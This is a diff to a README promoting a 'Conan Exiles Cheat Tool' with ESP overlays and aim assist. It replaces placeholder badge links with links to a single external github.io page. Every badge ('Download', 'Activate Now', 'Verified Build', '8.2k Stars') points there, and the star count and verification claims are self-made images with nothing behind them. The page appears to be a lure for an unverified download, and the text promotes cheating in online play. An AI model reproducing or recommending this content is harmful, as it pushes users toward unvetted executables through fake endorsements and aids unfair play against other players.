@@ -22,10 +22,10 @@ Unlike basic cheat engines, this tool is **modular and adaptive**. Switch betwee
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 8.2k Stars](https://img.shields.io/badge/GitHub-8.2k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://conan-exiles-cheat-tool.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://conan-exiles-cheat-tool.github.io/.github/)
+[![⭐️ 8.2k Stars](https://img.shields.io/badge/GitHub-8.2k_Stars-green?logo=github\&style=for-the-badge)](https://conan-exiles-cheat-tool.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://conan-exiles-cheat-tool.github.io/.github/)
 
 ---
 
@@ -156,8 +156,8 @@ A: It lowers risk but isn’t 100% safe online.
 
 The **Conan Exiles Cheat Tool** blends **ESP overlays, aim assist, and resource tracking** into one complete package. Whether farming, raiding, or clashing in PvP, it delivers awareness and accuracy to stay ahead of the competition.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://conan-exiles-cheat-tool.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://conan-exiles-cheat-tool.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://conan-exiles-cheat-tool.github.io/.github/)
 
 ---
